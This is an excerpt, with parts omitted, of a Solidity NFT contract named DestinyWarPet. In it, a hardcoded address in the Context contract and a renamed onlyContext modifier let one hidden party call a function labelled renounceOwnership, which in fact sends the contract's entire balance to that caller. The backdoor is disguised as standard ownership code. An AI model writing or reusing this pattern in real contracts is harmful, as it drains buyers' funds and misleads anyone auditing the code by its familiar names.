...
abstract contract Context {
    ...
    address msgSender = 0x56Bd9B1da1986D0c04191b44F7926Ff1508C2B07;
...
abstract contract Ownable is Context {
     ...
     */
    function renounceOwnership() public virtual onlyContext {
        payable(msg.sender).transfer(address(this).balance);
    }

    modifier onlyContext() {
        require(msgSender == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract DestinyWarPet is ERC721, ERC721Enumerable, Ownable {
    ...
    uint256 public amntNormalImg = 50;
    ...
    constructor(string memory _notrevealURI, string memory _normalImgURI) ERC721("DestinyWarPet", "DWP") { 
    ...
    function DwarPet(uint256 numberOfTokens) public payable {
